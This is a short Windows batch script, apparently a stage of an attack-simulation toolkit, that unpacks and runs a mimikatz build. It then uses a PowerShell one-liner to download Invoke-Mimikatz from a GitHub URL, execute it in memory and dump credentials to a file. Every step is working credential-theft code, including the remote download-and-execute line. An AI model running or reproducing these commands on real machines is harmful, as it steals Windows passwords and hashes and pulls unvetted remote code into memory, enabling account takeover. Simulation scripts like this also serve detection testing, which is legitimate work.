@ECHO OFF

ECHO ===========================================================================
ECHO MIMIKATZ
ECHO.
ECHO Dropping a custom mimikatz build into the APT dir
ping -n 5 127.0.0.1 > NUL

"%ZIP%" e -p%PASS% %TOOLARCH% -aoa -o"%APTDIR%" toolset\mim.exe > NUL

ECHO Executing it to get it into memory and saving the output to out.tmp ...
ping -n 5 127.0.0.1 > NUL
"%APTDIR%\mim.exe" > out.tmp

ECHO Extracting Mimik4tz output to target directory ...
ping -n 5 127.0.0.1 > NUL
"%ZIP%" e -p%PASS% %FILEARCH% -aoa -o"%APTDIR%" workfiles\mim-out.txt > NUL

ECHO Running Invoke-Mimikatz: downloading from github, run from memory 
powershell.exe "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" >> "%APTDIR%\moutput.tmp"
